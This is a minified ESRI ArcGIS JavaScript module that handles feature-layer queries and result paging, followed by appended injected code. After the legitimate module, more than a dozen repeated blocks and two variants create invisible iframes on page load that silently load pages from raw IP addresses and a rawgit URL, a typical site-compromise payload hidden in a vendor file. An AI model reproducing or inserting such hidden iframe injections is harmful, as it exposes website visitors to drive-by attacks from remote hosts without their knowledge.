// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/Deferred jimu/utils esri/tasks/query esri/tasks/QueryTask esri/layers/FeatureLayer".split(" "),function(n,e,g,k,p,l,m,r){function q(){return{queryTr:null,config:null,layerInfo:null,relationshipLayerInfos:null,relationshipPopupTemplates:null,queryType:-1,query:{maxRecordCount:1E3,resultLayer:null,where:"",geometry:null,relationship:null,nextIndex:0,allCount:0,objectIds:[]}}}n=n(null,{tempResultLayer:null,map:null,currentAttrs:null,constructor:function(a,
b){this.map=a;this.currentAttrs=b;0<this.currentAttrs.layerInfo.maxRecordCount&&(this.currentAttrs.query.maxRecordCount=this.currentAttrs.layerInfo.maxRecordCount)},resetCurrentAttrs:function(){this.currentAttrs=q()},getCurrentAttrs:function(){return this.currentAttrs},executeQueryForFirstTime:function(){var a=null,a=this.currentAttrs.query.where,b=this.currentAttrs.query.geometry;return a=1===this.currentAttrs.queryType?this.doQuery_SupportOrderByAndPagination(a,b):2===this.currentAttrs.queryType?
this.doQuery_SupportObjectIds(a,b):this.doQuery_NotSupportObjectIds(a,b)},executeQueryWhenScrollToBottom:function(){var a=null;1===this.currentAttrs.queryType?a=this.onResultsScroll_SupportOrderByAndPagination():2===this.currentAttrs.queryType&&(a=this.onResultsScroll_SupportObjectIds());return a},_isServiceSupportsOrderBy:function(a){var b=!1;a.advancedQueryCapabilities&&a.advancedQueryCapabilities.supportsOrderBy&&(b=!0);return b},_isServiceSupportsPagination:function(a){var b=!1;a.advancedQueryCapabilities&&
a.advancedQueryCapabilities.supportsPagination&&(b=!0);return b},_tryLocaleNumber:function(a){var b=p.localizeNumber(a);if(null===b||void 0===b)b=a;return b},_tryLocaleDate:function(a){var b=p.localizeDate(a);b||(b=a.toLocaleDateString());return b},_getLayerIndexByLayerUrl:function(a){var b=a.lastIndexOf("/");a=a.slice(b+1,a.length);return parseInt(a,10)},_getServiceUrlByLayerUrl:function(a){var b=a.lastIndexOf("/");return a.slice(0,b)},_isSupportObjectIds:function(a){var b=0;a.currentVersion&&(b=
parseFloat(a.currentVersion));return 10<=b||a.hasOwnProperty("typeIdField")},_isImageServiceLayer:function(a){return-1<a.indexOf("/ImageServer")},_isTable:function(a){return"Table"===a.type},_getBestQueryName:function(a){for(var b=a=a?a+(" _"+this.nls.queryResult):a+this.nls.queryResult,d=g.map(this.map.graphicsLayerIds,e.hitch(this,function(a){return this.map.getLayer(a).name})),c=2;0<=g.indexOf(d,b);)b=a+"_"+c,c++;return b},getObjectIdsForAllRelatedRecordsAction:function(){var a=new k;if(this.currentAttrs.query.objectIds&&
0<this.currentAttrs.query.objectIds.length)a.resolve(this.currentAttrs.query.objectIds);else if(1===this.currentAttrs.queryType)a=this._queryIds(this.currentAttrs.query.where,this.currentAttrs.query.geometry,this.currentAttrs.query.relationship);else if(3===this.currentAttrs.queryType){var b=this.currentAttrs.config.objectIdField,d=g.map(this.currentAttrs.query.resultLayer.graphics,e.hitch(this,function(a){return parseInt(a.attributes[b],10)}));a.resolve(d)}return a},doQuery_SupportOrderByAndPagination:function(a,
b){var d=new k,c=e.hitch(this,function(a){console.error(a);d.reject(a)}),h=this.currentAttrs.query.relationship;this._queryCount(a,b,h).then(e.hitch(this,function(f){this.currentAttrs.query.allCount=f;0===f?d.resolve([]):(this.currentAttrs.query.nextIndex=0,this._queryWithPaginationAndOrder(a,b,0,this.currentAttrs.query.maxRecordCount,h).then(e.hitch(this,function(a){a=a.features;this.currentAttrs.query.nextIndex+=a.length;d.resolve(a)}),c))}),c);return d},onResultsScroll_SupportOrderByAndPagination:function(){var a=
new k,b=this.currentAttrs.query.nextIndex;if(b>=this.currentAttrs.query.allCount)return a.resolve([]),a;var d=e.hitch(this,function(b){console.error(b);a.reject(b)});this._queryWithPaginationAndOrder(this.currentAttrs.query.where,this.currentAttrs.query.geometry,b,this.currentAttrs.query.maxRecordCount,this.currentAttrs.query.relationship).then(e.hitch(this,function(b){b=b.features;this.currentAttrs.query.nextIndex+=b.length;a.resolve(b)}),d);return a},doQuery_SupportObjectIds:function(a,b){var d=
new k,c=e.hitch(this,function(a){console.error(a);d.reject(a)}),h=this.currentAttrs.query.relationship;this._queryIds(a,b,h).then(e.hitch(this,function(a){if(a&&0<a.length){var b=this.currentAttrs.query.allCount=a.length;this.currentAttrs.query.objectIds=a;this.currentAttrs.query.nextIndex=0;var f=this.currentAttrs.query.maxRecordCount,g=[],g=b>f?a.slice(0,f):a;this._queryByObjectIds(g,!0,h).then(e.hitch(this,function(a){a=a.features;this.currentAttrs.query.nextIndex+=a.length;d.resolve(a)}),e.hitch(this,
function(a){c(a)}))}else this.currentAttrs.query.allCount=0,d.resolve([])}),c);return d},onResultsScroll_SupportObjectIds:function(){var a=new k,b=this.currentAttrs.query.objectIds,d=this.currentAttrs.query.nextIndex;if(d>=this.currentAttrs.query.allCount)a.resolve([]);else if(b=b.slice(d,d+Math.min(b.length-d,this.currentAttrs.query.maxRecordCount)),0===b.length)a.resolve([]);else return this._queryByObjectIds(b,!0,this.currentAttrs.query.relationship).then(e.hitch(this,function(b){b=b.features;
this.currentAttrs.query.nextIndex+=b.length;a.resolve(b)}),e.hitch(this,function(b){a.reject(b)})),a},doQuery_NotSupportObjectIds:function(a,b){var d=new k;this._query(a,b,!0,this.currentAttrs.query.relationship).then(e.hitch(this,function(a){a=a.features;this.currentAttrs.query.allCount=a.length;d.resolve(a)}),e.hitch(this,function(a){console.error(a);d.reject(a)}));return d},getOutputFields:function(){var a=[];g.forEach(this.currentAttrs.layerInfo.fields,e.hitch(this,function(b){b&&b.name&&"esriFieldTypeGeometry"!==
b.type&&a.push(b.name)}));return a},_getObjectIdField:function(){return this.currentAttrs.config.objectIdField},_getRequiredFieldNames:function(){var a=e.clone(this.currentAttrs.layerInfo);return(new r({layerDefinition:a,featureSet:null})).getOutFields()},_getPopupInfoFieldNames:function(){var a=[],b=[],d=g.filter(this.currentAttrs.layerInfo.fields,e.hitch(this,function(a){return"esriFieldTypeGeometry"!==a.type})),c=this.currentAttrs.config.popupInfo,b=b.concat(this._getPlaceholderFieldNames(d,c.title));
c.description?b=b.concat(this._getPlaceholderFieldNames(d,c.description)):c.fieldInfos&&0<c.fieldInfos.length&&g.forEach(c.fieldInfos,e.hitch(this,function(a){a.visible&&b.push(a.fieldName)}));c.mediaInfos&&0<c.mediaInfos.length&&g.forEach(c.mediaInfos,e.hitch(this,function(a){b=b.concat(this._getPlaceholderFieldNames(d,a.title));b=b.concat(this._getPlaceholderFieldNames(d,a.caption));if(a=a.value){var c=a.fields;c&&0<c.length&&g.forEach(c,e.hitch(this,function(a){b.push(a)}));a.normalizeField&&b.push(a.normalizeField);
a.tooltipField&&b.push(a.tooltipField);a.sourceURL&&(b=b.concat(this._getPlaceholderFieldNames(d,a.sourceURL)));a.linkURL&&(b=b.concat(this._getPlaceholderFieldNames(d,a.linkURL)))}}));g.forEach(b,e.hitch(this,function(b){0>a.indexOf(b)&&a.push(b)}));return a},_getPlaceholderFieldNames:function(a,b){var d=[];if(b){var c=[];g.forEach(a,e.hitch(this,function(a){a=a.name;0<=b.indexOf("{"+a+"}")&&c.push(a)}));g.forEach(c,e.hitch(this,function(a){0>d.indexOf(a)&&d.push(a)}))}return d},_query:function(a,
b,d,c){var e=new l;e.where=a;b&&(e.geometry=b);e.outSpatialReference=this.map.spatialReference;e.returnGeometry=!!d;e.spatialRelationship=c;e.outFields=this.getOutputFields();return(new m(this.currentAttrs.config.url)).execute(e)},_queryIds:function(a,b,d){var c=new l;c.where=a;b&&(c.geometry=b);c.returnGeometry=!1;c.spatialRelationship=d;c.outSpatialReference=this.map.spatialReference;return(new m(this.currentAttrs.config.url)).executeForIds(c)},_queryByObjectIds:function(a,b,d){var c=new k,h=new l;
h.returnGeometry=!!b;h.outSpatialReference=this.map.spatialReference;h.outFields=this.getOutputFields();h.objectIds=a;h.spatialRelationship=d;(new m(this.currentAttrs.config.url)).execute(h).then(e.hitch(this,function(a){c.resolve(a)}),e.hitch(this,function(f){if(400===f.code){var h=this._getObjectIdField(),k="",l=a.length;g.forEach(a,e.hitch(this,function(a,b){k+=h+" \x3d "+a;b!==l-1&&(k+=" OR ")}));this._query(k,null,b,d).then(e.hitch(this,function(a){c.resolve(a)}),e.hitch(this,function(a){c.reject(a)}))}else c.reject(f)}));
return c},_queryCount:function(a,b,d){var c=new l;c.where=a;b&&(c.geometry=b);c.returnGeometry=!1;c.outSpatialReference=this.map.spatialReference;c.spatialRelationship=d;return(new m(this.currentAttrs.config.url)).executeForCount(c)},_queryWithPaginationAndOrder:function(a,b,d,c,h){var f=new l;f.where=a;b&&(f.geometry=b);f.outSpatialReference=this.map.spatialReference;f.returnGeometry=!0;f.spatialRelationship=h;f.outFields=this.getOutputFields();f.start=d;f.num=c;(a=this.currentAttrs.config.orderByFields)&&
0<a.length&&(f.orderByFields=a,a=g.map(a,e.hitch(this,function(a){return a.split(" ")[0]})),g.forEach(a,e.hitch(this,function(a){0>f.outFields.indexOf(a)&&f.outFields.push(a)})));return(new m(this.currentAttrs.config.url)).execute(f)}});n.getCleanCurrentAttrsTemplate=q;return n});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});